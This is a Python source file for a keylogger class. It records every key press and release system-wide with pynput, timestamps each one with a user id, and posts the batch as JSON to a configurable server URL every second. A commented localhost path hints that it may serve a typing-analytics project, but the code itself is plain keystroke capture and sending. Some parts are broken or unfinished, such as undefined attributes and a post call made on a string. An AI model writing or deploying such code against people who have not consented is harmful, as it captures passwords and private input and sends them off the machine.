from pynput import keyboard
from datetime import datetime
from threading import Timer
import websocket
import requests
import time
import json

class Keylogger:

    def __init__(self, websocketUrl, userId = None):
        self.userId = userId
        self.websocketUrl = websocketUrl
        self.keystrokeDTOs = []
        
    def onKeyRelease(self,key):
        self._recordKeystroke("Released", key)
        
    def onKeyPress(self, key):
        
        self._recordKeystroke("Pressed", key)
    
    def _recordKeystroke(self, event, key):
        timestamp = time.time()
        
        try:
            keyCode = key.char
        except AttributeError:
            keyCode = str(key)
            keyCode = keyCode[4:]
        
        self.keystrokeDTOs.append({
            "key_code": str(keyCode),
            "event": event,
            "timestamp": timestamp,
            "user": self.userId
        })
    
    def reportToServer(self):
        if self.keystrokeDTOs:
            # ws = websocket.WebSocket()
            # ws.connect(self.websocketUrl)
            # ws.send(json.dumps(self.keystrokeDTOs))
            # ws.close()
        # url = "http://localhost:8000/api/user/keystrokes/add/"
            headers = {
                "Content-Type": "application/json"
            }
            body = json.dumps(self.keystrokeDTOs)
            res = self.userSessionId.post(self.websocketUrl, data=body, headers=headers)
            self.keystrokeDTOs = []
    
    def on_open(self, ws):
        print("WebSocket connection established.")

    def on_message(self, ws, message):
        print("Received message:", message)

    def on_error(self, ws, error):
        print("WebSocket error:", error)

    def on_close(self, ws):
        print("WebSocket connection closed.")   
    
    def report(self):
        
        if self.keystrokeDTOs:
            
            if self.reportMethod=='server':
                self.reportToServer()
        self.keystrokeDTOs = []
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self,userId="",userSessionId=""):
        
        self.userId = userId
        self.userSessionId = userSessionId
        
        print(f"{datetime.now()} - Started keylogger")
        
        self.running = True
        self.start_dt = datetime.now()

        self.listener = keyboard.Listener(on_press=self.onKeyPress, on_release=self.onKeyRelease)
        
        self.listener.start()
        
        while self.running:
            self.reportToServer()
            time.sleep(1)
        
        # self.report()
        # listener.join()
    
    def stop(self):
        self.running = False
        print(f"{datetime.now()} - Stopped keylogger")
        if self.listener is not None:
            self.listener.stop()
            self.listener = None
        
            
        
        
        